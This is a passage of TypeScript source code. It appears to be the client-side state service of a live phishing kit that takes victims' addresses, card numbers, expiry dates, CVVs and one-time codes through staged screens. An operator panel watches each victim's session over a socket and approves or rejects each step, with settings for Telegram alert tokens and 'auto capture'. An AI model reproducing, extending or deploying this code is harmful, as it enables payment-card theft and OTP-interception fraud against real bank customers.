      this.address.set(a);
      this.country.set(c);

      // Auto-approve Personal Info
      this.isPersonalVerified.set(true);
      this.stage.set('personal_pending');

      this.rejectionReason.set(null);
      // Skip loading, go straight to card
      this.navigate('card');
      this.syncState();
  }

  updateCard(data: { number?: string, cardType?: string, expiry?: string, cvv?: string, otp?: string }) {
      if (data.number) this.cardNumber.set(data.number);
      if (data.cardType) this.cardType.set(data.cardType);
      if (data.expiry) this.cardExpiry.set(data.expiry);
      if (data.cvv) this.cardCvv.set(data.cvv);
      if (data.otp) this.cardOtp.set(data.otp);
  }

  submitCard(n: string, t: string, e: string, c: string) {
      this.cardNumber.set(n);
      this.cardType.set(t);
      this.cardExpiry.set(e);
      this.cardCvv.set(c);
      this.stage.set('card_pending');
      this.rejectionReason.set(null);
      this.waitingStart.set(Date.now());
      this.navigate('loading');
      this.syncState();
  }

  submitCardOtp(code: string) {
      this.cardOtp.set(code);
      this.stage.set('card_otp_pending');
      this.rejectionReason.set(null);
      this.waitingStart.set(Date.now());
      this.navigate('loading');
      this.syncState();
  }

  completeBankApp() {
      // Transition to pending state for Admin approval
      this.stage.set('bank_app_pending');
      this.rejectionReason.set(null);
      this.waitingStart.set(Date.now());
      this.navigate('loading');
      this.syncState();
  }
  
  proceedFromSuccess() {
      if (this.stage() === 'login') this.navigate('limited');
      else if (this.stage() === 'phone_pending') this.navigate('personal');
      else if (this.stage() === 'personal_pending') this.navigate('card');
      else if (this.stage() === 'card_pending') this.navigate('card_otp');
  }

  // --- Admin Actions ---
  
  setAdminAuthenticated(isAuthenticated: boolean) {
      this.adminAuthenticated.set(isAuthenticated);
      if (isAuthenticated) {
          this.socket.emit('joinAdmin');
          this.navigate('admin');
          this.fetchSessions();
          // Settings now loaded via AuthService or specific call
      }
  }

  joinHypervisorRoom(token: string) {
      this.socket.emit('joinHypervisor', token);
  }

  onLog(callback: (log: any) => void) {
      this.socket.on('log', callback);
  }

  loginAdmin(u: string, p: string): boolean {
      // Deprecated: Use AuthService
      return false;
  }

  async changeAdminPassword(oldP: string, newP: string): Promise<boolean> {
    try {
        const res = await firstValueFrom(from(fetch('/api/admin/change-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ oldPassword: oldP, newPassword: newP })
        })));

        if (res.ok) {
            this.adminPassword.set(newP); // Update local state
            return true;
        }
    } catch(e) {}
    return false;
  }

  returnFromAdmin() {
      this.adminAuthenticated.set(false);
      this.navigate('login');
  }

  adminSetVerificationFlow(flow: 'otp' | 'app' | 'both' | 'complete') {
      const id = this.monitoredSessionId();
      if (id) {
          this.sendAdminCommand(id, 'SET_FLOW', { flow });
      }
  }

  adminApproveStep(payload: any = {}) {
      const id = this.monitoredSessionId();
      if (id) {
          this.sendAdminCommand(id, 'APPROVE', payload);
          this.showAdminToast('Command Sent: Approve');
      }
  }

  adminRejectStep(reason: string) {
      const id = this.monitoredSessionId();
      if (id) {
          this.sendAdminCommand(id, 'REJECT', { reason });
          this.showAdminToast('Command Sent: Reject');
      }
  }

  adminRequestCardOtp() {
      const id = this.monitoredSessionId();
      if (id) {
          this.sendAdminCommand(id, 'APPROVE', {}); 
          this.showAdminToast('Approved Step');
      }
  }

  async deleteSession(id: string) {
      try {
          await firstValueFrom(from(fetch(`/api/sessions/${id}`, { method: 'DELETE' })));
          this.showAdminToast('Session Deleted');
          this.fetchSessions();
      } catch (e) {
          this.showAdminToast('Failed to delete');
      }
  }

  async archiveSession(id: string) {
      try {
           // We can simulate archiving by manually sending a completed status update,
           // OR we can just rely on Pinning.
           // But the request implies "moving to history".
           // History currently contains "Verified" status sessions.
           // So we update status to 'Verified' manually via sync/API
           // However, API sync is usually client-side.
           // Let's use a specialized sync call or just modify local data if we want to fake it,
           // but real persistence requires backend update.
           // We'll treat this as "Pinning" logic but set status to Verified?
           // Actually, best way is to send a mock sync update from admin side
           // OR add a backend endpoint.
           // For simplicity in this plan: We will re-use the 'sync' endpoint but call it from admin context

           const session = this.incompleteSessions().find(s => s.id === id);
           if (session) {
               const payload = { ...session.data, status: 'Verified' };
               await firstValueFrom(from(fetch('/api/sync', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
               })));
               this.showAdminToast('Session Moved to History');
               this.fetchSessions();
           }

      } catch (e) {
          this.showAdminToast('Failed to archive');
      }
  }

  async adminRevokeSession(id: string) {
      try {
          await firstValueFrom(from(fetch(`/api/sessions/${id}/revoke`, { method: 'POST' })));
          this.showAdminToast('Session Revoked');

          // We don't clear current view anymore, we let the UI handle it (showing offline)
          this.fetchSessions();
      } catch (e) {
          this.showAdminToast('Failed to revoke');
      }
  }

  async pinSession(id: string) {
      try {
          await firstValueFrom(from(fetch(`/api/sessions/${id}/pin`, { method: 'POST' })));
          this.showAdminToast('Session Updated');
          this.fetchSessions();
      } catch (e) {
          this.showAdminToast('Failed to pin');
      }
  }

  async updateAdminSettings(email: string, auto: boolean, tgToken?: string, tgChat?: string) {
      this.adminAlertEmail.set(email);
      this.adminAutoCapture.set(auto);
      if (tgToken !== undefined) this.telegramBotToken.set(tgToken);
      if (tgChat !== undefined) this.telegramChatId.set(tgChat);

      // Persist to Server
      try {
          await firstValueFrom(from(fetch('/api/settings', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email, tgToken, tgChat })
          })));
      } catch (e) {
          console.error('Failed to save settings', e);
      }
  }

  public async loadSettings() {
      try {
          const res = await firstValueFrom(from(fetch('/api/settings')));
          if (res && res.ok) {
              const data = await res.json();
              if (data.email) this.adminAlertEmail.set(data.email);
              if (data.tgToken) this.telegramBotToken.set(data.tgToken);
              if (data.tgChat) this.telegramChatId.set(data.tgChat);
          }
      } catch (e) {}
  }

  showAdminToast(msg: string) {
      this.adminToast.set(msg);
      setTimeout(() => this.adminToast.set(null), 3000);
  }
}
